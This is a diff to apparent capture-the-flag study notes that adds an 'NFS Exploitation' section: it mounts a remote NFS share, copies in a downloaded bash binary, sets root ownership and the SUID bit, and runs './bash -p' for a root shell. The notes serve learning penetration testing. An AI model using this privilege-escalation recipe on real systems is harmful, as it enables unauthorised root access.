@@ -53,3 +53,24 @@ mkdir /tmp/mount
 ```bash
 sudo mount -t nfs 10.10.14.219:/home /tmp/mount/ -nolock
 ```
+
+# NFS Exploitation
+
+[Ubuntu Server bash executable](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
+
+Place in mount directory on attack machine
+Must be owned by root
+
+```bash
+sudo chown root bash
+```
+
+Set SUID bit
+
+```bash
+sudo chmod +s bash
+```
+
+```bash
+./bash -p
+```
